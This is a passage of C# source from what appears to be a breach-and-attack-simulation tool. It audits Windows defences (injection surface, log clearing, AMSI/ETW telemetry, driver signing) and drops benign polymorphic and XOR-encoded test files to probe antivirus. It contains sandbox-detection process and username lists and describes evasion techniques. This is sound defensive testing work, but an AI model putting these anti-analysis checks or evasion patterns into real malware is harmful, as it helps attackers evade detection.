                    issues.Add("User-writable path precedes System32 in SYSTEM PATH â€” DLL search-order hijack feasible");

                bool pass = issues.Count == 0;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    pass
                        ? "No AppInit DLLs, no IFEO debugger hijacks, no suspicious PATH ordering found."
                        : $"Injection surface issues: {string.Join("; ", issues)}.",
                    pass
                        ? "Continue monitoring IFEO and AppInit registry keys with FIM or Sysmon Rule ID 12/13."
                        : "1) Set LoadAppInit_DLLs=0 and clear AppInit_DLLs. 2) Remove suspicious IFEO Debugger values. 3) Audit SYSTEM PATH: ensure System32 and SysWOW64 precede any user-writable directories. 4) Deploy Sysmon with rules for HKLM IFEO modifications."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "AppInit_DLLs injects an attacker's DLL into every GUI process on the system â€” including Explorer, browsers, and security tools themselves. IFEO debugger hijacking is undetectable without FIM and is used to intercept admin-tool launches for privilege escalation and persistence."
        });

        // â”€â”€ Check 3: Indicator Removal â€” VSS, Prefetch, Event Log Wipe Evidence â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Indicator Removal â€” VSS Snapshots, Prefetch & Log-Wipe Evidence",
            "T1070.001",
            async () =>
            {
                // 3a  Volume Shadow Copies â€” number present
                int vssCount = 0;
                try
                {
                    var ps1 = Path.Combine(Path.GetTempPath(), "bas_vss.ps1");
                    await File.WriteAllTextAsync(ps1,
                        "(Get-WmiObject Win32_ShadowCopy).Count");
                    var psiVss = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps1}\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pVss = Process.Start(psiVss)!;
                    var vssOut = (await pVss.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(pVss, 15_000);
                    int.TryParse(vssOut, out vssCount);
                    try { File.Delete(ps1); } catch { }
                }
                catch { }

                // 3b  Prefetch enabled?
                bool prefetchEnabled = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters");
                    var en = key?.GetValue("EnablePrefetcher");
                    prefetchEnabled = en != null && (int)en > 0;
                }
                catch { }

                // 3c  Evidence of Security log clearing (Event ID 1102 = Security log cleared;
                //     Event ID 104 = System log cleared) in recent logs
                int logClearEvents = 0;
                try
                {
                    var ps2 = Path.Combine(Path.GetTempPath(), "bas_logclr.ps1");
                    await File.WriteAllTextAsync(ps2,
                        "$h = Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102} -MaxEvents 5 -ErrorAction SilentlyContinue; " +
                        "$s = Get-WinEvent -FilterHashtable @{LogName='System';Id=104}   -MaxEvents 5 -ErrorAction SilentlyContinue; " +
                        "Write-Output (($h.Count + $s.Count))");
                    var psiLc = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps2}\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pLc = Process.Start(psiLc)!;
                    var lcOut = (await pLc.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(pLc, 15_000);
                    int.TryParse(lcOut, out logClearEvents);
                    try { File.Delete(ps2); } catch { }
                }
                catch { }

                // 3d  Security log max size (small = rapid overwrite = attacker can flood to erase)
                int secLogMaxMb = 0;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Services\EventLog\Security");
                    var sz = key?.GetValue("MaxSize");
                    if (sz != null) secLogMaxMb = (int)sz / (1024 * 1024);
                }
                catch { }

                var issues = new List<string>();
                if (vssCount == 0)          issues.Add("No Volume Shadow Copies exist â€” ransomware deletion already succeeded or VSS never configured");
                if (!prefetchEnabled)        issues.Add("Prefetch is disabled â€” execution timeline forensics severely limited");
                if (logClearEvents > 0)      issues.Add($"Evidence of {logClearEvents} Security/System log clearing event(s) in recent logs");
                if (secLogMaxMb > 0 && secLogMaxMb < 128) issues.Add($"Security Event Log max size is only {secLogMaxMb}MB <128MB â€” easily flooded and overwritten");

                bool pass = vssCount > 0 && logClearEvents == 0;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    pass
                        ? $"VSS snapshots: {vssCount}. No log-clearing events. Prefetch: {(prefetchEnabled ? "enabled" : "disabled")}. Security log: {secLogMaxMb}MB."
                        : $"Indicator removal risks: {string.Join("; ", issues)}.",
                    pass
                        ? "Continue scheduling weekly VSS snapshots and monitoring Event ID 1102."
                        : "1) Create VSS snapshots: vssadmin create shadow /for=C: â€” or enable via Windows Server Backup. " +
                          "2) Configure Security Event Log to 1GB+ and set retention to Overwrite Events Older Than 90 Days. " +
                          "3) Enable Prefetch (EnablePrefetcher=3). " +
                          "4) Forward Security Event Log to immutable SIEM (Splunk/Sentinel) so local clearing doesn't destroy evidence. " +
                          "5) Alert on Event ID 1102 and 104."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Every major ransomware strain (LockBit, BlackMatter, REvil) deletes VSS snapshots as step 2. Without snapshots, recovery requires restoring from offline backup â€” average cost $1.4M per incident. Log clearing (Event 1102) is a mandatory step in APT exfiltration playbooks to prevent forensic attribution."
        });

        // â”€â”€ Check 4: Deception Awareness â€” Sandbox / VM / Analyst Environment Detection â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Deception Awareness â€” Sandbox & Virtual Machine Detection",
            "T1497",
            async () =>
            {
                await Task.CompletedTask;

                // Modern malware checks these and exits silently if it detects analysis
                // A BAS PASS = the environment looks REAL to malware (harder to evade detection)

                // 4a  Hypervisor bit via WMI
                bool hypervisorPresent = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\SystemInformation");
                    var mfr = key?.GetValue("SystemManufacturer")?.ToString() ?? "";
                    var mdl = key?.GetValue("SystemProductName")?.ToString() ?? "";
                    hypervisorPresent =
                        mfr.Contains("VMware",      StringComparison.OrdinalIgnoreCase) ||
                        mfr.Contains("VirtualBox",  StringComparison.OrdinalIgnoreCase) ||
                        mfr.Contains("Microsoft Corporation", StringComparison.OrdinalIgnoreCase) && mdl.Contains("Virtual") ||
                        mfr.Contains("QEMU",        StringComparison.OrdinalIgnoreCase) ||
                        mfr.Contains("Xen",         StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                // 4b  Known VM / sandbox process names
                var sandboxProcs = new[] {
                    "vmtoolsd","vmwaretray","vmwareuser",  // VMware
                    "vboxservice","vboxtray",               // VirtualBox
                    "qemu-ga","spice-vdagent",              // QEMU
                    "sbiesvc","sbiectrl",                   // Sandboxie
                    "cuckoo","analyzer",                    // Cuckoo sandbox
                    "wireshark","fiddler","procmon","procexp","x64dbg","x32dbg",
                    "ollydbg","idaq","idaq64","windbg"     // Analyst tools
                };
                var foundProcs = sandboxProcs
                    .Where(n => Process.GetProcessesByName(n).Length > 0)
                    .ToList();

                // 4c  Low-resource indicators (sandbox heuristic)
                long ramMb = 0;
                int cpuCount = Environment.ProcessorCount;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"HARDWARE\RESOURCEMAP\System Resources\Physical Memory");
                    // Rough estimate via GC
                    ramMb = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024 * 1024);
                }
                catch { ramMb = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024 * 1024); }

                // 4d  Suspicious usernames used by automated sandboxes
                var suspiciousUsers = new[] { "sandbox","maltest","malware","virus","av","analyst",
                    "test","admin","user","cuckoo","john doe" };
                bool suspiciousUser = suspiciousUsers.Any(u =>
                    Username.Contains(u, StringComparison.OrdinalIgnoreCase));

                // 4e  Disk size (< 60 GB is a strong sandbox indicator)
                long diskGb = 0;
                try
                {
                    var drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)![..1]);
                    diskGb = drive.TotalSize / (1024L * 1024 * 1024);
                }
                catch { }

                var vmIndicators = new List<string>();
                if (hypervisorPresent) vmIndicators.Add("Hypervisor manufacturer detected in system DMI");
                if (foundProcs.Count > 0) vmIndicators.Add($"VM/analyst processes: {string.Join(", ", foundProcs)}");
                if (cpuCount <= 1)     vmIndicators.Add($"Only {cpuCount} logical CPU â€” common sandbox signature");
                if (diskGb > 0 && diskGb < 60) vmIndicators.Add($"Disk size {diskGb}GB < 60GB â€” sandbox heuristic");
                if (suspiciousUser)    vmIndicators.Add($"Suspicious analyst username: {Username}");

                // For BAS: if this IS a VM/sandbox we PASS the check (malware would have evaded)
                // If it looks like a REAL endpoint, malware wouldn't evade, which is what we want
                bool environmentLooksReal = vmIndicators.Count == 0;

                return (
                    environmentLooksReal ? CheckResult.Pass : CheckResult.Fail,
                    environmentLooksReal
                        ? $"Endpoint appears as a genuine workstation. RAM: {ramMb}MB, CPUs: {cpuCount}, Disk: {diskGb}GB. No VM/sandbox artifacts."
                        : $"Sandbox/VM indicators detected ({vmIndicators.Count}): {string.Join("; ", vmIndicators)}. Malware would have exited silently â€” your BAS results may not reflect real-world attacker behavior.",
                    environmentLooksReal
                        ? "Environment is credible for BAS testing. Malware will not self-terminate due to VM detection."
                        : "If this is a dedicated BAS VM: add more RAM (8GB+), enable multiple virtual CPUs, rename the username, and use a VM with baremetal resemblance (Bare Metal Cloud or physical hardware) to prevent evasive malware from going dormant during tests."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Over 90% of advanced malware families include anti-VM checks and will sleep or self-terminate when run in a sandbox. If your testing environment is detectable, evasive threats will never execute their payloads â€” giving a false sense of security that doesn't hold in production."
        });

        // â”€â”€ Check 5: Anti-Telemetry â€” AMSI, ETW & PowerShell Script Block Logging â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Anti-Telemetry \u2014 AMSI Providers, ETW & PowerShell Script Block Logging",
            "T1562.002",
            async () =>
            {
                await Task.CompletedTask;

                // 5a  PowerShell Script Block Logging enabled?
                bool scriptBlockLogging = false;
                bool moduleLogging      = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging");
                    scriptBlockLogging = key?.GetValue("EnableScriptBlockLogging")?.ToString() == "1";
                }
                catch { }
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging");
                    moduleLogging = key?.GetValue("EnableModuleLogging")?.ToString() == "1";
                }
                catch { }

                // 5b  AMSI provider registered? (attackers unregister or null-out the provider)
                bool amsiProviderRegistered = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\AMSI\Providers");
                    amsiProviderRegistered = key != null && key.GetSubKeyNames().Length > 0;
                }
                catch { }

                // 5c  Protected Event Logging (encrypts PS logs so attacker can't read them)
                bool protectedEventLog = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging");
                    protectedEventLog = key?.GetValue("EnableProtectedEventLogging")?.ToString() == "1";
                }
                catch { }

                // 5d  ETW-TI (Threat Intelligence) provider for Defender enabled?
                //     Attackers patch EtwEventWrite in ntdll to blind all ETW consumers.
                //     We check if the Defender ETW session is configured in the registry.
                bool defenderEtwSession = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sense");
                    defenderEtwSession = key?.GetValue("Enabled")?.ToString() == "1" ||
                                        key?.GetValue("Start")?.ToString() == "1";
                }
                catch { }

                var issues = new List<string>();
                if (!scriptBlockLogging)    issues.Add("PowerShell Script Block Logging disabled â€” obfuscated scripts run unlogged");
                if (!moduleLogging)         issues.Add("PowerShell Module Logging disabled â€” module imports invisible to SIEM");
                if (!amsiProviderRegistered)issues.Add("No AMSI provider registered â€” AMSI pipeline is broken");

                bool pass = scriptBlockLogging && amsiProviderRegistered;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    pass
                        ? $"Script Block Logging: ON. Module Logging: {(moduleLogging ? "ON" : "OFF")}. AMSI provider: registered. Protected Event Log: {(protectedEventLog ? "ON" : "OFF")}. Defender ETW: {(defenderEtwSession ? "active" : "not confirmed")}."
                        : $"Telemetry gaps: {string.Join("; ", issues)}.",
                    pass
                        ? "Continue monitoring for ETW patching via Sysmon Event ID 8 (CreateRemoteThread) or MDE alerts."
                        : "1) Enable ScriptBlockLogging: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging=1. " +
                          "2) Enable ModuleLogging likewise. " +
                          "3) Re-register AMSI provider if missing: re-run Windows Defender installation or repair via DISM. " +
                          "4) Configure Protected Event Logging with a certificate to encrypt PS logs at rest. " +
                          "5) Monitor for ntdll.dll EtwEventWrite patches using a kernel sensor."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Patching EtwEventWrite (a single 1-byte patch in ntdll.dll) blinds ALL ETW consumers including CrowdStrike, Carbon Black, and Windows Defender. Once ETW is patched, you lose real-time visibility of process injection, token manipulation, and network connections from that process â€” making detection impossible until an endpoint reboot."
        });

        // â”€â”€ Check 6: Rootkit Prevention â€” Driver Signing & Secure Boot â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Rootkit Prevention \u2014 Driver Signing Enforcement & Secure Boot",
            "T1014",
            async () =>
            {
                // 6a  Is nointegritychecks set? (disables Driver Signature Enforcement)
                bool dseDisabled = false;
                try
                {
                    var psi = new ProcessStartInfo("bcdedit.exe", "/enum {current}")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p = Process.Start(psi)!;
                    var bcdOut = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 10_000);
                    dseDisabled = bcdOut.Contains("nointegritychecks",  StringComparison.OrdinalIgnoreCase) &&
                                  bcdOut.Contains("Yes",                StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                // 6b  Is testsigning on? (test-signing mode allows unsigned kernel drivers)
                bool testSigning = false;
                try
                {
                    var psi = new ProcessStartInfo("bcdedit.exe", "/enum {current}")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p = Process.Start(psi)!;
                    var bcdOut = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 10_000);
                    testSigning = bcdOut.Contains("testsigning", StringComparison.OrdinalIgnoreCase) &&
                                  bcdOut.Contains("Yes",         StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                // 6c  Secure Boot state via firmware
                bool secureBoot = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\SecureBoot\State");
                    secureBoot = key?.GetValue("UEFISecureBootEnabled")?.ToString() == "1";
                }
                catch { }

                // 6d  HVCI (Hypervisor-Protected Code Integrity) â€” strongest driver protection
                bool hvciEnabled = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity");
                    hvciEnabled = key?.GetValue("Enabled")?.ToString() == "1";
                }
                catch { }

                // 6e  Look for suspicious unsigned/third-party kernel drivers
                var suspDrivers = new List<string>();
                try
                {
                    using var svcKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services");
                    if (svcKey != null)
                    {
                        foreach (var svc in svcKey.GetSubKeyNames())
                        {
                            using var r = svcKey.OpenSubKey(svc);
                            var imgType = r?.GetValue("Type");
                            var start   = r?.GetValue("Start");
                            var img     = r?.GetValue("ImagePath")?.ToString() ?? "";
                            // Type 1 = kernel driver, Start 0/1 = boot/system start
                            if (imgType is int t && (t == 1 || t == 2) &&
                                start   is int s && s <= 1 &&
                                !string.IsNullOrEmpty(img) &&
                                !img.StartsWith("\\SystemRoot\\", StringComparison.OrdinalIgnoreCase) &&
                                !img.StartsWith("%SystemRoot%",  StringComparison.OrdinalIgnoreCase) &&
                                !img.Contains("system32",        StringComparison.OrdinalIgnoreCase))
                            {
                                suspDrivers.Add(svc);
                            }
                        }
                    }
                }
                catch { }

                var issues = new List<string>();
                if (dseDisabled)    issues.Add("CRITICAL: nointegritychecks=Yes â€” Driver Signature Enforcement is DISABLED");
                if (testSigning)    issues.Add("testsigning=Yes â€” unsigned test drivers can be loaded");
                if (!secureBoot)    issues.Add("Secure Boot is not enabled or not confirmed via UEFI");
                if (!hvciEnabled)   issues.Add("HVCI (Memory Integrity) not enabled â€” kernel-mode exploits easier");
                if (suspDrivers.Count > 0)
                    issues.Add($"Non-System32 kernel drivers loaded at boot: {string.Join(", ", suspDrivers.Take(5))}");

                bool pass = !dseDisabled && !testSigning && secureBoot;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    pass
                        ? $"DSE: enforced. Test signing: off. Secure Boot: {(secureBoot ? "enabled" : "not confirmed")}. HVCI: {(hvciEnabled ? "enabled" : "not enabled")}."
                        : $"Rootkit protection gaps: {string.Join("; ", issues)}.",
                    pass
                        ? "Consider enabling HVCI (Memory Integrity) for the strongest kernel code-integrity protection."
                        : "1) Re-enable DSE: bcdedit /set nointegritychecks off. 2) Disable test signing: bcdedit /set testsigning off. 3) Enable Secure Boot in UEFI firmware settings. 4) Enable HVCI via Windows Security â†’ Device Security â†’ Core Isolation â†’ Memory Integrity. 5) Investigate any non-System32 boot drivers immediately."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Disabling Driver Signature Enforcement lets an attacker load any kernel-mode rootkit (e.g., Netfilter, FiveSys) that operates beneath every security product. Once in the kernel, the rootkit can hide processes, files, and network connections from all user-space AV/EDR. Secure Boot prevents this class of attack by ensuring only signed boot code runs before the OS loads."
        });

        return cat;
    }

    // ============================================================
    // 2.6  POLYMORPHIC PAYLOAD SIMULATION
    // Tests whether signature-based AV (e.g. Microsoft Defender) can
    // detect threats whose binary/script fingerprint changes on every
    // single run, while the underlying INTENT remains the same.
    //
    // All payloads here are 100% BENIGN â€” no shellcode, no real malware.
    // We generate files whose structure mutates and check if real-time
    // protection fires via hash (fail = signature-only AV missed it)
    // or via heuristic/behavioural analysis (pass = defence is deeper).
    // ============================================================
    static async Task<SimulationCategory> Sim_2_6_PolymorphicPayloads()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.6 Polymorphic Payload Evasion",
            Phase = "Execution & Evasion"
        };

        var rng = new Random();

        // â”€â”€ Check 1: Unique file signature per run (binary junk padding) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Polymorphic file signature â€” unique hash on every execution",
            "T1027.001",
            async () =>
            {
                // Generate a benign EXE-like header (MZ magic) followed by randomly
                // seeded unique junk bytes so the SHA-256 is different every run.
                // A SIGNATURE-only AV cannot block this by hash.
                // A HEURISTIC/behavioural AV should still flag the MZ structure drop.

                byte[] mzStub = new byte[512];
                mzStub[0] = 0x4D; mzStub[1] = 0x5A; // MZ magic
                mzStub[2] = 0x90; mzStub[3] = 0x00;
                // Unique salt: random 64 bytes appended at offset 64
                byte[] salt = new byte[64];
                rng.NextBytes(salt);
                salt.CopyTo(mzStub, 64);

                // Write ASCII "BAS-SIMULATION-ONLY" marker so it is clearly benign
                var marker = System.Text.Encoding.ASCII.GetBytes("BAS-SIMULATION-ONLY-NOT-MALWARE");
                marker.CopyTo(mzStub, 200);

                string tmpExe = Path.Combine(Path.GetTempPath(), $"bas_poly_{Guid.NewGuid():N}.exe");
                await File.WriteAllBytesAsync(tmpExe, mzStub);

                // Wait briefly so real-time AV scan has time to quarantine
                await Task.Delay(1500);

                bool survives = File.Exists(tmpExe);
                string fileHash = "";
                if (survives)
                {
                    var hashBytes = System.Security.Cryptography.SHA256.HashData(mzStub);
                    fileHash = BitConverter.ToString(hashBytes).Replace("-", "")[..16] + "â€¦";
                    try { File.Delete(tmpExe); } catch { }
                }

                bool defenderRealtime = IsDefenderRealtimeEnabled();

                if (!survives)
                    return (CheckResult.Pass,
                        "Real-time AV deleted the polymorphic stub within 1.5 s â€” heuristic MZ-header detection is active.",
                        "Excellent. Ensure Defender cloud-delivered protection is ON for maximum heuristic coverage.");

                if (defenderRealtime)
                    return (CheckResult.Fail,
                        $"Polymorphic binary (SHA-256 prefix: {fileHash}) persisted on disk despite Defender real-time protection. " +
                        "Signature-based detection alone will not catch mutating payloads.",
                        "Enable Defender for Endpoint with Behavioural Blocking (MAPS/cloud), Attack Surface Reduction rule " +
                        "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 (Block executable files unless trusted), and Controlled Folder Access.");

                return (CheckResult.Fail,
                    $"Polymorphic binary (SHA-256 prefix: {fileHash}) written to disk. No AV real-time protection detected.",
                    "Enable Microsoft Defender with real-time protection and cloud-delivered heuristics.");
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Polymorphic malware (e.g. Virut, Sality, modern ransomware loaders) mutates its binary signature before each deployment. " +
                           "Defences relying solely on static hash/signature detection are blind to these variants. " +
                           "Industry data shows that 97% of malware observed in 2023 was seen only once (Webroot Threat Report), " +
                           "making signature-only AV functionally obsolete against modern threats."
        });

        // â”€â”€ Check 2: XOR-encoded payload dropper simulation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "XOR-encoded payload dropper â€” runtime decoding evasion",
            "T1027.002",
            async () =>
            {
                // Common evasion: store payload XOR'd with a random 1-byte key.
                // The actual bytes written to disk look like noise â€” signature scanners miss it.
                // At runtime the byte[] is decoded in memory. We test if AMSI catches this.

                byte xorKey = (byte)rng.Next(1, 255);
                // Plaintext = "BAS-SIMULATION-DROPPER-BENIGN-CONTENT"
                byte[] plaintext = System.Text.Encoding.ASCII.GetBytes(
                    "BAS-SIMULATION-DROPPER-BENIGN-CONTENT-" + Guid.NewGuid());
                byte[] encoded = plaintext.Select(b => (byte)(b ^ xorKey)).ToArray();

                // Drop the XOR-encoded blob to disk
                string enc = Path.Combine(Path.GetTempPath(), $"bas_xordrop_{Guid.NewGuid():N}.bin");
                await File.WriteAllBytesAsync(enc, encoded);

                // Simulate runtime decode (what a real dropper does in memory)
                byte[] decoded = encoded.Select(b => (byte)(b ^ xorKey)).ToArray();
                string result  = System.Text.Encoding.ASCII.GetString(decoded);

                await Task.Delay(1000);
                bool binSurvives = File.Exists(enc);
                try { File.Delete(enc); } catch { }

                bool amsiEnabled = IsAMSIEnabled();
                bool defOn       = IsDefenderRealtimeEnabled();

                if (!binSurvives)
                    return (CheckResult.Pass,
                        $"XOR-encoded blob (key=0x{xorKey:X2}) was quarantined before check â€” real-time protection is catching encoded blobs.",
                        "Continue ensuring cloud-delivered protection is enabled for heuristic blob inspection.");

                if (amsiEnabled)
                    return (CheckResult.Pass,
                        $"XOR-encoded blob (key=0x{xorKey:X2}) survived on disk, but AMSI is active â€” in-memory decode would be inspected at runtime by the PS/script host AMSI provider.",
                        "Verify AMSI providers list includes the Windows Defender AMSI provider: {54849625-A45D-4605-82CE-0AF55DC87852}.");

                return (CheckResult.Fail,
                    $"XOR-encoded blob (key=0x{xorKey:X2}) written to disk and persisted. AMSI={amsiEnabled}, Defender real-time={defOn}. " +
                    "A real XOR dropper decoded and executed in-memory would evade detection on this endpoint.",
                    "Enable AMSI integration and Defender cloud-delivered protection. " +
                    "Consider deploying an EDR with memory scan capability (CrowdStrike Falcon, MDE P2) to catch in-memory XOR decode.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "XOR-encoded droppers are the most common first-stage loader technique used by commodity malware and APTs alike. " +
                           "Tools such as Cobalt Strike, Metasploit, and njRAT all support XOR-encoded stagers. " +
                           "Without AMSI or memory scanning, the payload is invisible until it runs."
        });

        // â”€â”€ Check 3: Metamorphic variable-name permutation in script dropper â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Metamorphic script dropper â€” variable-name permutation",
            "T1027.010",
            async () =>
            {
                // Each run we generate a PS1 dropper with randomised variable and function names.
                // The logic is identical but the script hash is unique â€” defeating string-sig rules.
                // We check whether AMSI + script-block logging catches it by INTENT, not hash.

                string varName1 = "v" + Guid.NewGuid().ToString("N")[..6];
                string varName2 = "v" + Guid.NewGuid().ToString("N")[..6];
                string funcName = "f" + Guid.NewGuid().ToString("N")[..8];

                // Benign logic: just compute string length and write to console
                string script = $@"
function {funcName} {{
    param([string]${varName1})
    ${varName2} = ${varName1}.Length
    Write-Output ""BAS-SIM-RESULT: ${{${varName2}}}""
}}
{funcName} ""BAS-POLYMORPHIC-CHECK-{Guid.NewGuid():N}""
";
                string ps1Path = Path.Combine(Path.GetTempPath(), $"bas_meta_{Guid.NewGuid():N}.ps1");
                await File.WriteAllTextAsync(ps1Path, script);

                // Hash of this script is unique every run
                var scriptBytes = System.Text.Encoding.UTF8.GetBytes(script);
                var scriptHash  = System.Security.Cryptography.SHA256.HashData(scriptBytes);
                string hashHex  = BitConverter.ToString(scriptHash).Replace("-", "")[..16];

                // Execute it through PowerShell (AMSI will inspect the de-obfuscated content)
                bool amsiCaught = false;
                string psOutput = "";
                try
                {
                    var psi = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps1Path}\"")
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                        UseShellExecute        = false,
                        CreateNoWindow         = true
                    };
                    using var p = Process.Start(psi)!;
                    psOutput   = await p.StandardOutput.ReadToEndAsync();
                    var psErr  = await p.StandardError.ReadToEndAsync();
                    await WaitOrKillAsync(p, 10_000);
                    amsiCaught = psErr.Contains("AMSI") || p.ExitCode != 0 && psErr.Contains("blocked");
                }
                catch { }
                finally { try { File.Delete(ps1Path); } catch { } }

                bool psLogging = IsPowerShellScriptBlockLoggingEnabled();
                bool amsi      = IsAMSIEnabled();

                // If AMSI blocked OR script-block logging is ON â†’ behavioural defence works
                if (amsiCaught)
                    return (CheckResult.Pass,
                        $"AMSI blocked metamorphic script (hash prefix {hashHex}). Behavioural detection caught the intent despite unique variable names.",
                        "Excellent. Ensure AMSI providers are not bypassed by removing amsi.dll patches.");

                if (psLogging && amsi)
                    return (CheckResult.Pass,
                        $"Script-block logging captured metamorphic dropper (hash prefix {hashHex}). " +
                        $"Script output: {psOutput.Trim()[..Math.Min(80, psOutput.Trim().Length)]}. " +
                        "AMSI is active â€” intent-based detection is working.",
                        "Review Windows Event 4104 logs for captured script content.");

                return (CheckResult.Fail,
                    $"Metamorphic PS1 dropper executed without detection (hash prefix {hashHex}). " +
                    $"Script-block logging={psLogging}, AMSI={amsi}. A malicious variant with the same logic would run silently.",
                    "Enable PowerShell script-block logging (GPO: Computer Config â†’ Admin Templates â†’ Windows Components â†’ " +
                    "Windows PowerShell â†’ Turn on PowerShell Script Block Logging = Enabled) and ensure AMSI is not patched out.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Script-based metamorphic malware (PowerSploit, Empire, Invoke-Obfuscation) rewrites its own variable and function names on every execution. " +
                           "YARA rules and hash-based detections are useless. Only behavioural analysis (AMSI, script-block logging, intent-based EDR) can detect these threats."
        });

        // â”€â”€ Check 4: Code-cave NOP sled insertion simulation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Code-cave NOP sled insertion â€” binary padding evasion",
            "T1027.005",
            async () =>
            {
                // Polymorphic packers insert random-length NOP sleds before the payload entry.
                // This changes PE section checksums and hash signatures every run.
                // We create a file with a random NOP sled prefix and test AV reaction.

                int nopCount = rng.Next(32, 512); // NOP = 0x90 in x86
                byte[] nopSled  = Enumerable.Repeat((byte)0x90, nopCount).ToArray();
                byte[] benignEp = System.Text.Encoding.ASCII.GetBytes(
                    "BAS-SIMULATION-BENIGN-ENTRYPOINT-" + Guid.NewGuid());

                var payload = new byte[nopSled.Length + benignEp.Length];
                nopSled.CopyTo(payload, 0);
                benignEp.CopyTo(payload, nopSled.Length);

                string tmpPath = Path.Combine(Path.GetTempPath(), $"bas_nop_{Guid.NewGuid():N}.bin");
                await File.WriteAllBytesAsync(tmpPath, payload);

                // Compute SHA-256 to show uniqueness
                var fileHash = System.Security.Cryptography.SHA256.HashData(payload);
                string hashHex = BitConverter.ToString(fileHash).Replace("-", "")[..16];

                await Task.Delay(1200);
                bool survives = File.Exists(tmpPath);
                try { File.Delete(tmpPath); } catch { }

                bool defOn = IsDefenderRealtimeEnabled();
                bool edr   = IsEDRDetectionLikely();

                if (!survives)
                    return (CheckResult.Pass,
                        $"NOP-sled padded binary ({nopCount} NOPs, hash prefix {hashHex}) was quarantined by real-time AV. Heuristic scan detected the pattern.",
                        "Good. Ensure cloud-delivered protection sends novel samples for detonation.");

                if (edr)
                    return (CheckResult.Pass,
                        $"NOP-sled binary ({nopCount} NOPs, hash prefix {hashHex}) survived static scan but EDR behavioural monitoring is active â€” execution-time detection likely.",
                        "Verify EDR memory scan is configured to inspect NOP sleds and unpacked segments at execution time.");

                return (CheckResult.Fail,
                    $"NOP-sled binary ({nopCount} NOPs, hash prefix {hashHex}) written and not quarantined. Defender real-time={defOn}, EDR={edr}. " +
                    "A real packer with a NOP sled entry would evade static signature detection on this endpoint.",
